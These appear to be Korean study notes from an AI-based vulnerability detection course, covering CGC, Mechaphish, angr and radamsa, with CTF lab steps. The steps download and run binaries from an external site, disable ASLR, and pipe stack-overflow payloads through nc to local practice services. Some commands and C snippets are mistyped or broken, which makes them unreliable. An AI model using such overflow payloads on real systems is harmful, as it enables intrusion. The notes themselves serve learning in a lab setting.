# PART3. AI 기반 취약점 탐지  

DCREE라는 7개만 가능한 sw 써서 CGC 진행됨    

### AI 기반 취약점 탐지 대회  
모든 참가팀의 서버에 CB가 데몬으로 세팅되어 있음
자신의 CB를 분석하여 취약점을 찾은 후 다른 탐가팀의 데몬을 공격한 후 키값을 획득함  
발견된 취약점은 패치를 진행하여 방어하도록 함  

#### mechaphish 라는 오픈 소스  
스택 오버 플로우 기법 ROP 기법으로 shell코드로 넘기고    
command injection은 Type2로 공격에 성공하게 하는  

취약한 바이너리에서 퍼징 , 자동으로 취약점 찾아내는, 

#### AEG
퍼징, symbolic Execution 기법을 통하여 취약점을 찾음  
익스플로잇 코드를 자동 생성하여 공격함  

퍼징: radamsa fuzz  
symbolic Execution등 분석 : ANGR  
익스플로잇 코드 생성 : REX  -> 공격코드 쉘코드로 자동 저장?   

#### Angr : shellphish 팀에서 개발한 symbolic Excution  
#### Radamsa Fuzzer : 취약한 함수의 입력값을 찾거나 크래쉬 부분  

#### AI 기반 취약점 탐지 대회  
CWE 취약점 공통항목 중 시스템 해킹에 이용될 수 있는 항목들 위주로 취약한 바이너리 문제가 제공됨  
#### Angr : shellphish 팀에서 개발한 symbolic Excution  
#### Radamsa Fuzzer : 취약한 함수의 입력값을 찾거나 크래쉬 부분  


-----
### 실습
#### 초기 비밀번호 설정
```
sudo passwd root
su
id
```

#### 예전 아키텍처 사용

```
disass main ( 어셈블리 명령어확인) 
```
       
```
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
b *main+35 (브레이크 포인트 걸기)
r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
info reg
x/16x $sep
```

#### 쉘 코드 작성 - 스택오버플로우  
```
wget http://javahacking.com/aihacking/shell.txt
cat shell.txt
```

```
sysctl -w kernel.randomize_va_space = 0  //커널 고정
wget http://javahacking.com/aihacking/getenv
chmod 755 getenv
./getenv
>(nil)
```

```
sysctl -w kernel.randomize_va_space = 0  //커널 고정
./getenv
./getenv //고정됐는지 확인!
> 0xffff1aa5

./login `perl -e 'print "A"x8, "\xa5\x1a\xff\xff"'`
>AAAAAAAA????
exit 
```

#### CTF  
```
wget http://javahacking.com/aihacking/nonull
chmod 755 nonull
./nonull
```
#### 접속됐는지 확인하기 위해 shell 하나 더 켜서
```
netstate -na
nc localhost 12344
```

#### 실제 nonull.txt 파일 보고 공격해보기
```
// nonull.txt 소스
nonull
12344

#define MAX_RECV 128

char key[MAX_RECV] = {0x00, };
char gs[4] = {0xadm 0x00, 0x00, 0xff};
char buf[MAX_RECV] = {0x00, };

fp = fopen("/home/ctf2/key", "r");
fread(key, 1024m 1m fp);
fclose(fp);

recv_data(sock, buf, MAX_RECV + 5);
send_data(sock, buf, strlen(buf));
```
- key, gs, buf 값 할당  
- key라는 변수에 key값 들어가 있음  

manage_client 

ebp  

key  
4byte   
buf  

esp  

1. 5byte overflow./
2. 문자열의 끝은 널 바이트(0x00) 구분
3. 0x00까지 덮으면 문자열이 끝나지 않은 줄 알고 키 값까지 출력
```   
apt-get install pyyhon
(python -c `print"A"*123;cat)|nc localhost 12344
nc localhost 12344
잘 모르겠당!
```

#### random ctf3
```
//random 코드
wget http://javahacking.com/aihacking/nonull
./random
nc locallhost 12350


char key[16] = {0x00, };
char buf[64] = {0x00, };
FILE *fp;

fp = fopen("/dev/urandom", "r");
fread(key, 4, 1, fp);
fclose(fp);

recv_data(sock, buf, 69);  //64인데 69 받을수 있기 때문에 버퍼오버플로우!!!  
strcpy(&key[4], "eroverflow");

if(!strcmp(key, "buferoverflow"))
       {
              fp = fopen("/home/ctf3/key", "r");
              fread(buf, 1024, 1, fp);
              fclose(fp);
              
              send_data(sock, buf, strlen(buf));
       }
else {
              send_data(sock, print, strlen(print));
              send_data(sock, key, strlen(key));
       }
```

#### main 터미널
```
home/ctf3 디렉토리에   
vi key해서 아무거나 입력 후 저장
```

```
wget http://javahacking.com/aihacking/random
chmod 755 random
./random
```

#### sub 터미널
(python -c 'print"A"*64+"buff"';cat)|nc localhost 12350
```

-------------
### numgame 
```
mkdir ctf4
cd ctf4
wget http://javahacking.com/aihacking/numgame
chmod 755 numgame
./numgame
```

### sub
```
nc localhost 12343
```

-----
### ANGR  
#### 설치
```
sudo apt-get install python3-pip python3-dev
pip3 install virtualenv virtualenvwrapper
virtualenv  
```

```
vi /root/.bashrc
export WORKON_HOME=~/.environments
source /usr/local/bin/virualenvwrapper.sh

(/user/share/virtualenvwrapper/virtualwrapper.sh)
```

```
mkvirtualenv angr
workon angr     //이거 했을 때 에러 안 떠야 정상!!  
pip3 install angr
```

#### .environments 폴더 내 angr 파일 설치된 것 확인
- .environments 폴더로 가서 
```
python
import angr
```

#### Angr 예시 - Defcamp r100 문제  
```
wget http://javahacking.com/aihacking/r100
chmod 755 r100
./r100
```

#### r100_solver.py 파일 생성
```
교재 233쪽
```
---
#### Radamda Fuzzer
```
퍼즈 테스팅 도구
커맨드라인 기반으로 작동하며, 샘플 파일(입력 값)을 주입하면자동으로변이된 결과물을 생산
사용자의 입력 값을 무작위로 생성해서 넣어줌 
```

#### 라담사 설치
```
sudo apt-get install acc make git wget
git clone http://gitlab.com/akihe/radamsa.git
cd radamsa
make
make install
```

```
echo "aaa" | radamsa
```
해볼 때 마다 다른 출력값 나오는 거 볼 수 있음!!!!!!  
             






